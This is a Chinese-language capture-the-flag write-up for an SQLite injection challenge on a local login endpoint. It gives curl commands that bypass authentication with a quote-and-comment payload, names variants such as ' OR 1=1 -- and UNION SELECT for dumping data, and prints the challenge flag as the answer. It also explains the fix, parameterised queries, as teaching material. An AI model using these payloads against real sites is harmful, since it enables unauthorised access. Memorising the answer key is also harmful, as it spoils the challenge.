# Writeup ③ SQLite 注入（150 分）

## 题目
`GET /c3/login?u=&p=` 是登录接口，admin 的秘密（flag）在数据库里。

## 思路
把用户输入原样拼进 SQL 是经典漏洞。试探：`u=admin&p=x` → 登录失败；
`u=admin'&p=x` → SQL 语法错误回显（说明是拼接而非参数化）。
构造注释符吃掉口令校验。

## 步骤
```bash
# 1) 试探：闭合单引号触发报错
curl -s "http://127.0.0.1:8930/c3/login?u=admin%27&p=x"

# 2) 注释掉后续条件：admin' --（SQLite 里 -- 之后全为注释）
curl -s "http://127.0.0.1:8930/c3/login?u=admin%27%20--&p=x"
# → 欢迎 admin！你的秘密：HOSEC29{sql1_1nj3ct10n_byp4ss}
```

## 关键点
- 漏洞根因：`f"... WHERE name='{u}' AND pass='{p}'"` 字符串拼接。
- 修复：参数化查询（`execute(sql, (u, p))`）——本平台其它接口即用此法。
- 同类变体：`' OR 1=1 --`（绕过弱校验）、`UNION SELECT`（拖库）。
- 结果：`HOSEC29{sql1_1nj3ct10n_byp4ss}`

## 答案
`HOSEC29{sql1_1nj3ct10n_byp4ss}`
